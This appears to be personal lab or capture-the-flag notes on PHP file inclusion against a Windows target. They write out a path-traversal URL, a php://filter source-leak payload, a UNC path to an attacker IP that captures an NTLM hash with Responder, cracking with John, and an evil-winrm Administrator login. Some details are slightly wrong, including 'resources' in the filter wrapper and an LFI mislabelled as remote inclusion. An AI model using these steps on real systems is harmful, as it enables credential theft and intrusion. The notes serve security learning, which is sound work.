# File Inclusion: Local & Remote

Unprotected URL and Services allows assets exploration.


## Remote File Includsion

* PHP upon Windows Services abusing NTLM

This access type abuse the Local File Include (LFI) vulnerability. Which allows to include paths in the URL like "http://target.com/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts".

This is a wordlist to find common paths to resources. https://github.com/drtychai/wordlists/blob/master/intruder/lfi.txt

It's possible to get a page in base64 looking for credentials abusing the url apllying filters, php filters in this case: index.php?page=php://filter/convert.base64-encode/resources=index.php

1. responder: set the interface

```
# here is using the VPN to access the target
responder -I tun0 
```

2. vulnerable URL: request for our machine

```
"http://target.com/index.php?page=//10.10.14.16/somefile"
```

3. Responder gives a Hash
4. Save the Hash in file
5. Break the Hash using John the Ripper + a wordlist

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
$> badminton
```

6. evil-rwin

```
evil-winrm -i 10.129.243.212 -u Administrator -p badminton 
```

## How NTLM is abussed

If a Windows client cannot resolve a hostname using the DNS service, 
it pushed the multicast name resolution protocol or better called “LLMNR” 
to ask neighboring computers to resolve IPv4 and even under IPv6 addresses.

If the request using LLMNR fails, the NetBios Name Service or NBT-NS protocol 
was reasserted which accomplishes the same goal as above.

So when a host uses LLMNR or NBT-NS to resolve a request for a network resource, 
it is possible that any host on the network that knows the IP address 
of the queried host can respond. Even if a host responds to one of these requests 
with incorrect information, it will still be considered legitimate, 
at that stage where the Responder.py tool is placed to capture credentials.
